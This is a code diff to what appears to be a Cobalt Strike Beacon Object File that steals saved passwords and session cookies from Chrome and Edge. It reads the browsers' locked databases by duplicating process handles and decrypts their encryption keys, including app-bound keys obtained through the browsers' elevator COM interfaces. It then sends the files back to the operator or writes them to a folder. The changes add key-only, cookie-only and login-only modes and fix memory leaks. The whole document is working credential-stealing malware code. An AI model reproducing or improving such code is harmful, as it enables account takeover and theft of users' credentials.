@@ -13,6 +13,7 @@
 
 WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
 WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
 WINBASEAPI DWORD   WINAPI KERNEL32$GetFileSize (HANDLE hFile, LPDWORD lpFileSizeHigh);
 WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalAlloc (UINT uFlags, SIZE_T dwBytes);
 WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalReAlloc (HGLOBAL hMem, SIZE_T dwBytes, UINT uFlags);
@@ -197,6 +198,7 @@ VOID GetMasterKey(CHAR *key) {
     // rewind to the start of the buffer
     KERNEL32$GlobalFree(byteKey - 5);
     KERNEL32$GlobalFree(output);
+    KERNEL32$LocalFree(final.pbData);
 }
 
 // https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824
@@ -352,6 +354,13 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     
     MSVCRT$free(encrypted_key_with_header);
     MSVCRT$free(encrypted_key);
+    if (MSVCRT$strcmp(browser, "chrome") == 0){
+        hr = chromeElevator->lpVtbl->Release(chromeElevator);
+    }
+    if (MSVCRT$strcmp(browser, "msedge") == 0){
+        hr = edgeElevator->lpVtbl->Release(edgeElevator);
+    }
+
     OLE32$CoUninitialize();
 
     return;
@@ -533,13 +542,23 @@ VOID GetFirefoxInfo() {
 
 }
 
-VOID GetBrowserData(char * browser) {
+VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath) {
     //get handle to all processes
     HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe32;
     INT processCount = 0;
     BOOL databaseStatus = FALSE;
     BOOL passwordStatus = FALSE;
+    // if cookie only
+    if (cookie == 1 && loginData == 0) {
+        //then dont check for password data
+        passwordStatus = TRUE;
+    }
+    // if login data only
+    if (loginData == 1 && cookie == 0) {
+        //then dont check for cookie data
+        databaseStatus = TRUE;
+    }
     pe32.dwSize = sizeof(PROCESSENTRY32);
     
     char * browserProcess = "";
@@ -574,12 +593,12 @@ VOID GetBrowserData(char * browser) {
                 //edge was found, get cookies database
                 processCount++;
                 if (databaseStatus == FALSE){
-                    if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies", cookieDB)){
+                    if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies", cookieDB, folderPath)){
                         databaseStatus = TRUE;
                     }
                 }
                 if (passwordStatus == FALSE){
-                    if (GetBrowserFile(pe32.th32ProcessID, "Login Data", passwordDB)){
+                    if (GetBrowserFile(pe32.th32ProcessID, "Login Data", passwordDB, folderPath)){
                         passwordStatus = TRUE;
                     }
                 }
@@ -603,19 +622,54 @@ VOID GetBrowserData(char * browser) {
             BeaconPrintf(CALLBACK_ERROR,"%s COOKIES not found on host\n", browser);
             return;
         }
-        download_file(cookieDB,data, sizeof(data));
-
+        // if copy folder is not null, then copy to folder instead of download_file()
+        if (MSVCRT$strcmp(folderPath, "") != 0){
+            CHAR cookieFilePath[MAX_PATH];
+            MSVCRT$sprintf(cookieFilePath, "%s\\%s", folderPath, cookieDB);
+            HANDLE hFile = KERNEL32$CreateFileA(cookieFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            
+            if (hFile == INVALID_HANDLE_VALUE) {
+                BeaconPrintf(CALLBACK_ERROR, "Failed to write cookie file to %s\n", cookieFilePath);
+            } else {
+                DWORD written = 0;
+                KERNEL32$WriteFile(hFile, data, KERNEL32$GetFileSize(hFile, NULL), &written, NULL);
+                BeaconPrintf(CALLBACK_OUTPUT, "Wrote cookie file to: %s\n", cookieFilePath);
+                KERNEL32$CloseHandle(hFile);
+            }
+            
+        } else {
+            download_file(cookieDB,data, sizeof(data));
+        }
+        //download_file(cookieDB,data, sizeof(data));
         KERNEL32$GlobalFree(data);
         CHAR *passwordData = GetFileContent(passwordPath);
         if(passwordData == NULL) {
             BeaconPrintf(CALLBACK_ERROR,"%s LOGIN DATA not found on host\n", browser);
             return;
         }
-        download_file(passwordDB,passwordData, sizeof(passwordData));
+        // if copy folder is not null, then copy to folder instead of download_file()
+        if (MSVCRT$strcmp(folderPath, "") != 0){
+            CHAR passwordFilePath[MAX_PATH];
+            MSVCRT$sprintf(passwordFilePath, "%s\\%s", folderPath, passwordDB);
+            HANDLE hFile = KERNEL32$CreateFileA(passwordFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+            if (hFile == INVALID_HANDLE_VALUE) {
+                BeaconPrintf(CALLBACK_ERROR, "Failed to write password file to %s\n", passwordFilePath);
+            } else {
+                DWORD written = 0;
+                KERNEL32$WriteFile(hFile, passwordData, KERNEL32$GetFileSize(hFile, NULL), &written, NULL);
+                BeaconPrintf(CALLBACK_OUTPUT, "Wrote password file to: %s\n", passwordFilePath);
+                KERNEL32$CloseHandle(hFile);
+            }
+        } else {
+            download_file(passwordDB,passwordData, sizeof(passwordData));
+        }
+        //download_file(passwordDB,passwordData, sizeof(passwordData));
+        KERNEL32$GlobalFree(passwordData);
     }
 }
 
-BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
+BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath) {
     IMPORT_RESOLVE;
     
     //BeaconPrintf(CALLBACK_OUTPUT,"Browser PID found %d\n", PID);
@@ -716,7 +770,23 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
                             CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
                             KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
 
-                            download_file(downloadFileName,buffer, dwFileSize);
+                            //if folder path is not null, then copy to folder instead of download_file()
+                            if (MSVCRT$strcmp(folderPath, "") != 0){
+                                CHAR copyFilePath[MAX_PATH];
+                                MSVCRT$sprintf(copyFilePath, "%s\\%s", folderPath, downloadFileName);
+                                HANDLE hFile = KERNEL32$CreateFileA(copyFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                    
+                                if (hFile == INVALID_HANDLE_VALUE) {
+                                    BeaconPrintf(CALLBACK_ERROR, "Failed to write password file to %s\n", copyFilePath);
+                                } else {
+                                    DWORD written = 0;
+                                    KERNEL32$WriteFile(hFile, buffer, dwFileSize, &written, NULL);
+                                    BeaconPrintf(CALLBACK_OUTPUT, "Wrote password file to: %s\n", copyFilePath);
+                                    KERNEL32$CloseHandle(hFile);
+                                }
+                            } else {
+                                download_file(downloadFileName,buffer, dwFileSize);
+                            }
                             
                             KERNEL32$GlobalFree(buffer);
                             KERNEL32$GlobalFree(shi);
@@ -1071,6 +1141,7 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     
     // Clean up
     KERNEL32$LocalFree(decrypted_blob.pbData);
+    KERNEL32$LocalFree(intermediate_blob.pbData);
     MSVCRT$free(encrypted_key);
     KERNEL32$GlobalFree(app_data);
     KERNEL32$GlobalFree(app_key);
@@ -1092,6 +1163,10 @@ VOID go(char *buf, int len) {
     int edgeCookiesPID = 0;
     int edgeLoginDataPID = 0;
     int pid = 0; 
+    int keyOnly = 0;
+    int cookieOnly = 0;
+    int loginDataOnly = 0;
+    char * copyFile = "";
     char * localStateFile = "";
     
     BeaconDataParse(&parser, buf, len);
@@ -1106,30 +1181,72 @@ VOID go(char *buf, int len) {
     edgeLoginDataPID = BeaconDataInt(&parser);
     pid = BeaconDataInt(&parser);
     localStateFile = BeaconDataExtract(&parser, NULL);
+    keyOnly = BeaconDataInt(&parser);
+    cookieOnly = BeaconDataInt(&parser);
+    loginDataOnly = BeaconDataInt(&parser);
+    copyFile = BeaconDataExtract(&parser, NULL);
+
     BOOL status = FALSE;
 
     if (chrome == 1 ){
         BeaconPrintf(CALLBACK_OUTPUT, "CHROME SELECTED");
+        if (keyOnly == 1){
+            BeaconPrintf(CALLBACK_OUTPUT, "KEY ONLY SELECTED");
+            GetEncryptionKey("chrome");
+            return;
+        }
+        if (cookieOnly == 1 || loginDataOnly == 1){
+            BeaconPrintf(CALLBACK_OUTPUT, "COOKIES ONLY SELECTED");
+            GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
+            return;
+        }
         GetEncryptionKey("chrome");
-        GetBrowserData("chrome");
+        GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
+        
         return;
     }
     else if (edge == 1 ){
         BeaconPrintf(CALLBACK_OUTPUT, "EDGE SELECTED");
+        if (keyOnly == 1){
+            GetEncryptionKey("msedge");
+            return;
+        }
+        if (cookieOnly == 1 || loginDataOnly == 1){
+            GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
+            return;
+        }
         GetEncryptionKey("msedge");
-        GetBrowserData("msedge");
+        GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
         return;
     }
     else if (system == 1){
         BeaconPrintf(CALLBACK_OUTPUT, "SYSTEM SELECTED");
-        if(AppBoundDecryptor(localStateFile, pid)){
+        //if key only, then get the key and exit
+        if (keyOnly == 1){
+            AppBoundDecryptor(localStateFile, pid);
+            return;
+        }
+        //if cookie or login data only, then get the cookies and/or passwords and exit
+        if (cookieOnly == 1 || loginDataOnly == 1){
             if (SHLWAPI$StrStrIA(localStateFile, "chrome") != NULL) {
                 BeaconPrintf(CALLBACK_OUTPUT, "Getting Chrome Cookies and Passwords");
-                GetBrowserData("chrome");
+                GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
             }
             if (SHLWAPI$StrStrIA(localStateFile, "edge") != NULL) {
                 BeaconPrintf(CALLBACK_OUTPUT, "Getting Edge Cookies and Passwords");
-                GetBrowserData("msedge");
+                GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
+            }
+            return;
+        }
+        
+        if(AppBoundDecryptor(localStateFile, pid)){
+            if (SHLWAPI$StrStrIA(localStateFile, "chrome") != NULL) {
+                BeaconPrintf(CALLBACK_OUTPUT, "Getting Chrome Cookies and Passwords");
+                GetBrowserData("chrome", cookieOnly, loginDataOnly, copyFile);
+            }
+            if (SHLWAPI$StrStrIA(localStateFile, "edge") != NULL) {
+                BeaconPrintf(CALLBACK_OUTPUT, "Getting Edge Cookies and Passwords");
+                GetBrowserData("msedge", cookieOnly, loginDataOnly, copyFile);
             }
         }
         return;
@@ -1142,29 +1259,69 @@ VOID go(char *buf, int len) {
     else if (chromeCookiesPID == 1){
         BeaconPrintf(CALLBACK_OUTPUT, "CHROME Cookies SELECTED");
         BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
+        //if key only, then get the key and exit
+        if (keyOnly == 1){
+            GetEncryptionKey("chrome");
+            return;
+        }
+        //if cookie or login data only, then get the cookies and/or passwords and exit
+        if (cookieOnly == 1){
+            GetBrowserFile(pid, "Cookies", "ChromeCookies.db", copyFile);
+            return;
+        }
         GetEncryptionKey("chrome");
-        GetBrowserFile(pid, "Cookies", "ChromeCookie.db");
+        GetBrowserFile(pid, "Cookies", "ChromeCookie.db", copyFile);
         return;
     }
     else if (chromeLoginDataPID == 1){
         BeaconPrintf(CALLBACK_OUTPUT, "CHROME Login Data SELECTED");
         BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
+        //if key only, then get the key and exit
+        if (keyOnly == 1){
+            GetEncryptionKey("chrome");
+            return;
+        }
+        //if cookie or login data only, then get the cookies and/or passwords and exit
+        if (loginDataOnly == 1){
+            GetBrowserFile(pid, "Login Data", "ChromePasswords.db", copyFile);
+            return;
+        }
         GetEncryptionKey("chrome");
-        GetBrowserFile(pid, "Login Data", "ChromePasswords.db");
+        GetBrowserFile(pid, "Login Data", "ChromePasswords.db", copyFile);
         return;
     }
     else if (edgeCookiesPID == 1){
         BeaconPrintf(CALLBACK_OUTPUT, "EDGE Cookies SELECTED");
         BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
+        //if key only, then get the key and exit
+        if (keyOnly == 1){
+            GetEncryptionKey("msedge");
+            return;
+        }
+        //if cookie or login data only, then get the cookies and/or passwords and exit
+        if (cookieOnly == 1){
+            GetBrowserFile(pid, "Cookies", "EdgeCookies.db", copyFile);
+            return;
+        }
         GetEncryptionKey("msedge");
-        GetBrowserFile(pid, "Cookies", "EdgeCookie.db");
+        GetBrowserFile(pid, "Cookies", "EdgeCookie.db", copyFile);
         return;
     }
     else if (edgeLoginDataPID == 1){
         BeaconPrintf(CALLBACK_OUTPUT, "EDGE Login Data SELECTED");
         BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
+        //if key only, then get the key and exit
+        if (keyOnly == 1){
+            GetEncryptionKey("msedge");
+            return;
+        }
+        //if cookie or login data only, then get the cookies and/or passwords and exit
+        if (loginDataOnly == 1){
+            GetBrowserFile(pid, "Login Data", "EdgePasswords.db", copyFile);
+            return;
+        }
         GetEncryptionKey("msedge");
-        GetBrowserFile(pid, "Login Data", "EdgePasswords.db");
+        GetBrowserFile(pid, "Login Data", "EdgePasswords.db", copyFile);
         return;
     }
     else{
